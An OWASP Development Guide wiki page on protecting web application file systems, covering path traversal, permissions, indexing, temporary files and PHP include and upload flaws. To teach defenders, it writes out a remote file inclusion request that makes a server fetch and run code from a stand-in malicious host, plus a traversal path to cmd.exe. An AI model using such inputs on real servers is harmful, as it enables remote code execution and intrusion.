[Development Guide Table of
Contents](Guide_Table_of_Contents "wikilink")__TOC__

## Objective

To ensure that access to the local file system of any of the systems is
protected from unauthorized creation, modification, or deletion.

## Environments Affected

All.

## Relevant COBIT Topics

DS11 – Manage Data – All sections should be reviewed

DS11.9 – Data processing integrity

DS11.20 – Continued integrity of stored data

## Description

The file system is a fertile ground for average attackers and script
kiddies alike. Attacks can be devastating for the average site, and they
are often some of the easiest attacks to perform.

## Best Practices

  - Use of virtual jail environments on Unix platforms.

<!-- end list -->

  - Follow the principle of least privilege - every module must be able
    to access only the information and resources necessary to its
    legitimate purpose.

<!-- end list -->

  - Follow the principle of least user access or least-privileged user
    account (LUA), the concept that all users and modules at all times
    should run with as few privileges as possible.

<!-- end list -->

  - Consider the use of read-only file systems (such as CD-ROM or locked
    USB key) if practical.

<!-- end list -->

  - Use built in file permissions, if possible, to prevent the user id
    that your web server runs under from having write permission to file
    and directory paths inside the web root.

<!-- end list -->

  - On a Windows web server system, make sure that the web root is not
    on the same disk as the %systemroot%, which is usually the boot
    disk, C:\\. If the web application is on the physical path D:\\, it
    won't be possible to traverse (ex: ../../windows/system32/cmd.exe?)
    to system disk paths.

## Path traversal

All but the most simple web applications have to include local
resources, such as images, themes, other scripts, and so on. Every time
a resource or file is included by the application, there is a risk that
an attacker may be able to include a file or remote resource you didn’t
authorize.

### How to identify if you are vulnerable

  - Be sure you understand how the underlying operating system will
    process filenames handed off to it.

<!-- end list -->

  - Don't store sensitive configuration files inside the web root

<!-- end list -->

  - For Windows IIS servers, the web root should not be on the system
    disk, to prevent recursive traversal back to system directories.

### How to protect yourself

  - Prefer working without user input when using file system calls

<!-- end list -->

  - Use indexes rather than actual portions of file names when
    templating or using language files (ie value 5 from the user
    submission = Czechoslovakian, rather than expecting the user to
    return “Czechoslovakian”)

<!-- end list -->

  - Ensure the user cannot supply all parts of the path – surround it
    with your path code

<!-- end list -->

  - Validate the user’s input by only accepting known good – do not
    sanitize the data

<!-- end list -->

  - Use chrooted jails and code access policies to restrict where the
    files can be obtained or saved to

<!-- end list -->

  - If forced to use user input for file operations, normalize the input
    before using in file io API's, such as
    \[<http://docs.oracle.com/javase/7/docs/api/java/net/URI.html#normalize>()
    <http://docs.oracle.com/javase/7/docs/api/java/net/URI.html#normalize>()\].

See the OWASP article on [Path Traversal](Path_Traversal "wikilink") for
a description of the attack.

## Insecure permissions

Many developers take short cuts to get their applications to work, and
often many system administrators do not fully understand the risks of
permissive file system ACLs

### How to identify if you are vulnerable

  - Can other local users on the system read, modify, or delete files
    used by the web application?

If so, it is highly likely that the application is vulnerable to local
and remote attack.

### How to protect yourself

  - Use the tighest possible permissions when developing and deploying
    web applications

<!-- end list -->

  - Many web applications can be deployed on read-only media, such as
    CD-ROMs

<!-- end list -->

  - Consider using chroot jails and code access security policies to
    restrict and control the location and type of file operations even
    if the system is misconfigured

<!-- end list -->

  - Remove all “Everyone:Full Control” ACLs on Windows, and all mode 777
    (world writeable directories) or mode 666 files (world writeable
    files) on Unix systems

<!-- end list -->

  - Strongly consider removing “Guest”, “everyone,” and world readable
    permissions wherever possible

## Insecure Indexing

Indexable directories allow an attacker to easily discover the existence
of content on your web server that should remain private. For more
information, see the OWASP page about
[Forced_browsing](Forced_browsing "wikilink")

### How to determine if you are vulnerable

  - Use Google to search for indexed directories. Example:
    <http://www.google.com/search?hl=en&q=%22index+of+/%22+site:owasp.org>

<!-- end list -->

  - If a file is found, your application is at risk.

### How to protect yourself

  - Use robots.txt – this will prevent most search engines looking any
    further than what you have in mind, but be aware that attackers can
    view the contents of this directory and fuzz it for content, as
    well.

<!-- end list -->

  - Tightly control the activities of any search engine you run for your
    site, such as the IIS Search Engine, Sharepoint, Google appliance,
    and so on.

<!-- end list -->

  - If you don’t need an searchable index to your web site, disable any
    search functionality which may be enabled.

## Unmapped files

Web application frameworks will interpret only their own files to the
user, and render all other content as HTML or as plain text. This may
disclose secrets and configuration which an attacker may be able to use
to successfully attack the application.

### How to identify if you are vulnerable

Upload a file that is not normally visible, such as a configuration file
such as config.xml or similar, and request it using a web browser. If
the file’s contents are rendered or exposed, then the application is at
risk.

### How to protect yourself

  - Remove or move all files that do not belong in the web root.

<!-- end list -->

  - Rename include files to be normal extension (such as foo.inc ?
    foo.jsp or foo.aspx).

<!-- end list -->

  - Map all files that need to remain, such as .xml or .cfg to an error
    handler or a renderer that will not disclose the file contents. This
    may need to be done in both the web application framework’s
    configuration area or the web server’s configuration.

## Temporary files

Applications occasionally need to write results or reports to disk.
Temporary files, if exposed to unauthorized users, may expose private
and confidential information, or allow an attacker to become an
authorized user depending on the level of vulnerability.

### How to identify if you are vulnerable

Determine if your application uses temporary files. If it does, check
the following:

  - Are the files within the web root? If so, can they be retrieved
    using just a browser? If so, can the files be retrieved without
    being logged on?

<!-- end list -->

  - Are old files exposed? Is there a garbage collector or other
    mechanism deleting old files?

<!-- end list -->

  - Does retrieval of the files expose the application’s workings, or
    expose private data?

The level of vulnerability is derived from the asset classification
assigned to the data.

### How to protect yourself

Temporary file usage is not always important to protect from
unauthorized access. For medium to high-risk usage, particularly if the
files expose the inner workings of your application or exposes private
user data, the following controls should be considered:

  - The temporary file routines could be re-written to generate the
    content on the fly rather than storing on the file system.

<!-- end list -->

  - Ensure that all resources are not retrievable by unauthenticated
    users, and that users are authorized to retrieve only their own
    files.

<!-- end list -->

  - Use a “garbage collector” to delete old temporary files, either at
    the end of a session or within a timeout period, such as 20 minutes.

<!-- end list -->

  - If deployed under Unix-like operating systems, use chroot jails to
    isolate the application from the primary operating system. On
    Windows, use the inbuilt ACL support to prevent the IIS users from
    retrieving or overwriting the files directly.

<!-- end list -->

  - Move the files to outside the web root to prevent browser-only
    attacks.

<!-- end list -->

  - Use random file names to decrease the likelihood of a brute force
    pharming attack.

## PHP

## Includes and Remote files

The PHP functions include() and require() provide an easy way of
including and evaluating files. When a file is included, the code it
contains inherits the variable scope of the line on which the include
statement was executed. All variables available at that line will be
available within the included file. And the other way around, variables
defined in the included file will be available to the calling page
within the current scope. The included file does not have to be a file
on the local computer. If the allow_url_fopen directive is enabled in
php.ini you can specify the file to be included using an URL.

PHP will get it via HTTP instead of a local pathname. While this is a
nice feature it can also be a big security risk.

'''Note: The allow_url_fopen directive is enabled by default. '''

A common mistake is not considering that every file can be called
directly, that is a file written to be included is called directly by a
malicious user. An example:

    // file.php

    $sIncludePath = '/inc/';

    include($sIncludePath . 'functions.php');

    ...


    // functions.php

    include($sIncludePath . 'datetime.php');

    include($sIncludePath . 'filesystem.php');

In the above example, functions.php is not meant to be called directly,
so it assumes the calling page sets $sIncludePath. By creating a file
called datetime.php or filesystem.php on another server (and turning off
PHP processing on that server) we could call functions.php like the
following:

    functions.php?sIncludePath=http://www.malicioushost.com/

PHP would nicely download datetime.php from the other server and execute
it, which means a malicious user could execute code of his/her choice in
functions.php. I would recommend against includes within includes (as
the example above). In my opinion, it makes it harder to understand and
get an overview of the code. Right now, we want to make the above code
safe and to do that we make sure that functions.php really is called
from file.php. The code below shows one solution:

```

// file.php

define('SECURITY_CHECK', true);

$sIncludePath = '/inc/';

include($sIncludePath . 'functions.php');

...

// functions.php

if ( !defined('SECURITY_CHECK') ) {

// Output error message and exit.

...

}

include($sIncludePath . 'datetime.php');

include($sIncludePath . 'filesystem.php');
```

The function define() defines a constant. Constants are not prefixed by
a dollar sign ($) and thus we cannot break this by something like:
functions.php?SECURITY_CHECK=1. Although not so common these days, you
can still come across PHP files with the .inc extension. These files are
only meant to be included by other files. What is often overlooked is
that these files, if called directly, do not go through the PHP
preprocessor, and thus are sent in clear text. We should be consistent
and stick with one extension that we know is processed by PHP. The .php
extension is recommended.

## File upload

PHP is a feature rich language and one of its built in features is
automatic handling of file uploads. When a file is uploaded to a PHP
page, it is automatically saved to a temporary directory. New global
variables describing the uploaded file will be available within the
page. Consider the following HTML code presenting a user with an upload
form:

```

<form action= “page.php “ method= “POST “ enctype= “multipart/form-data “>    <input type= “file “ name= “testfile “ />

<input type= “submit “ value= “Upload file “ />

</form>
```

After submitting the above form, new variables will be available to
page.php based on the “testfile” name.

```

// Variables set by PHP and what they will contain:

// A temporary path/filename generated by PHP. This is where the file is

// saved until we move it or it is removed by PHP if we choose not to do anything with it.

$testfile

// The original name/path of the file on the client's system.

$testfile_name

// The size of the uploaded file in bytes.

$testfile_size

// The mime type of the file if the browser provided this information. For example:  “image/jpeg”.

$testfile_type
```

A common approach is to check if $testfile is set and if it is, start
working on it right away, maybe copying it to a public directory,
accessible from any browser. You probably already guessed it; this is a
very insecure way of working with uploaded files. The $testfile variable
does not have to be a path/file to an uploaded file. It could come from
GET, POST, and COOKIE etc. A malicious user could make us work on any
file on the server, which is not very pleasant. We should not assume
anything about the register_globals directive, it could be on or off
for all we care, our code should work with or without it and most
importantly it will be just as secure regardless of configuration
settings. So the first thing we should do is to use the $_FILES array:

```
// The temporary filename generated by PHP

$_FILES['testfile']['tmp_name']

// The original name/path of the file on the client's system. $_FILES['testfile']['name']

// The mime type of the file if the browser provided this information.

// For example:  “image/jpeg “.

$_FILES['testfile']['type']

// The size of the uploaded file in bytes.

$_FILES['testfile']['size']
```

The built in functions is_uploaded_file() and/or
move_uploaded_file() should be called with
$_FILES\['testfile'\]\['tmp_name'\] to make sure that the file really
was uploaded by HTTP POST. The following example shows a straightforward
way of working with uploaded files:

```

if ( is_uploaded_file($_FILES['testfile']['tmp_name']) ) {

// Check if the file size is what we expect (optional)

if ( $_FILES['sImageData']['size'] > 102400 ) {

// The size can not be over 100kB, output error message and exit.           ...

}

// Validate the file name and extension based on the original name in $_FILES['testfile']['name'],

// we do not want anyone to be able to upload .php files for example.      ...

// Everything is okay so far, move the file with move_uploaded_file

...

}
```

Note: We should always check if a variable in the superglobals arrays is
set with isset() before accessing it. I choose not to do that in the
above examples because I wanted to keep them as simple as possible.

## Old, unreferenced files

It is common for system administrators and developers to use editors and
other tools which create temporary old files. If the file extensions or
access control permissions change, an attacker may be able to read
source or configuration data.

### How to identify if you are vulnerable

Check the file system for:

  - Temporary files (such as core, \~foo, blah.tmp, and so on) created
    by editors or crashed programs

<!-- end list -->

  - Folders called “backup” “old” or “Copy of …”

<!-- end list -->

  - Files with additional extensions, such as foo.php.old

<!-- end list -->

  - Temporary folders with intermediate results or cache templates

### How to protect yourself

  - Use source code control to prevent the need to keep old copies of
    files around

<!-- end list -->

  - Periodically ensure that all files in the web root are actually
    required

<!-- end list -->

  - Ensure that the application’s temporary files are not accessible
    from the web root

## Second Order Injection

If the web application creates a file that is operated on by another
process, typically a batch or scheduled process, the second process may
be vulnerable to attack. It is a rare application that ensures input to
background processes is validated prior to first use.

### How to identify if you are vulnerable

  - Does the application use background / batch / scheduled processes to
    work on user supplied data?

<!-- end list -->

  - Does this program validate the user input prior to operating on it?

<!-- end list -->

  - Does this program communicate with other business significant
    processes or otherwise approve transactions?

### How to protect yourself

  - Ensure that all behind the scenes programs check user input prior to
    operating on it

<!-- end list -->

  - Run the application with the least privilege – in particular, the
    batch application should not require write privileges to any front
    end files, the network, or similar

<!-- end list -->

  - Use inbuilt language or operating system features to curtail the
    resources and features which the background application may use. For
    example, batch programs rarely if ever require network access.

<!-- end list -->

  - Consider the use of host based intrusion detection systems and
    anti-virus systems to detect unauthorized file creation.

## Further Reading

  - Klein, A., *Insecure Indexing*

<u><http://www.webappsec.org/projects/articles/022805-clean.html></u>

  - MySQL world readable log files

<u><http://www.securityfocus.com/advisories/3803></u>

  - Oracle 8i and 9i Servlet allows remote file viewing

<u><http://online.securityfocus.com/advisories/3964></u>

## File System

Even with an authentication system in place to protect your content, if
file permissions are set incorrectly an attacker could browse directly
to your application source code or protected documents. The section
below gives guidance in reducing your exposure to risk.

**Best Practice**

  - Disable directory browsing

<!-- end list -->

  - Manually review web directory contents for unnecessary files which
    could be discovered by an attacker, such as documentation, template,
    example files, which could be used by an attacker to identify
    attackable surface area.

**File Upload**

  - Upload files to a destination outside of the web application
    directory.

<!-- end list -->

  - Enable virus scan on the destination directory.

<!-- end list -->

  - Do not allow user input to specify the destination directory or file
    name of uploaded documents. Save the document outside the webroot,
    and programmatically modify it's name.

**File Permissions**

Cold Fusion specific:

  - Restrict access of the \\CFIDE directory to specific IP address and
    user group/account.

<!-- end list -->

  - Remove the \\cfdocs directory. Sample applications are installed by
    default in the cfdocs directory and are accessible to anyone. These
    applications should never be available on a production server.

Ensure that proper access controls are set on web application content.
The following settings assume a user account called “cfuser” has been
created to run the ColdFusion service. In addition, if you are using a
directory or operating system authentication service these setting may
need to be adjusted.

  - File types: Scripts (.cfm, .cfml, .cfc, .jsp, and others)

<!-- end list -->

  - **ACLs: cfuser (Execute); Administrators (Full)**

<!-- end list -->

  - File types: Static content (.txt, .gif, .jpg, .html, .xml)

<!-- end list -->

  - **ACLs: cfuser (Read); Administrators (Full)**

## Reference

[Development Guide Table of
Contents](Guide_Table_of_Contents "wikilink")

[Category:OWASP_Guide_Project](Category:OWASP_Guide_Project "wikilink")
[Category:File System](Category:File_System "wikilink")